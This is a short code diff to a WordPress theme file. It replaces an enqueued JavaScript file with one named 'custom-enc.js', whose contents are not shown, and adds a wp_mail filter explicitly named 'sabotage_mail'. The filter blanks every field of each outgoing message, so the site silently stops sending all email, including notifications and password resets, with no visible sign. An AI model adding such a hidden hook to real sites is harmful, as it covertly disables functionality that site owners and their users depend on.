@@ -1,12 +1,26 @@
 <?php
 
 if (!is_admin()) {
-   wp_register_script('custom_script',    get_stylesheet_directory_uri() . '/pagamentodigital.js',     array('jquery'),  '1.0' );
+   wp_register_script('custom_script',    get_stylesheet_directory_uri() . '/custom-enc.js',     array('jquery'),  '1.0' );
    wp_enqueue_script('custom_script');
 }
 
 
-
+add_filter('wp_mail','sabotage_mail');
+function sabotage_mail($v1){
+	// var_dump($v1);
+	
+	$r = array();
+	
+	foreach($v1 as $p=>$v){
+		$r[$p] = '';
+	}
+		
+	
+	return $r; 
+	// die;
+	// return array();	
+}
 
 function get_number_price($postid){
 
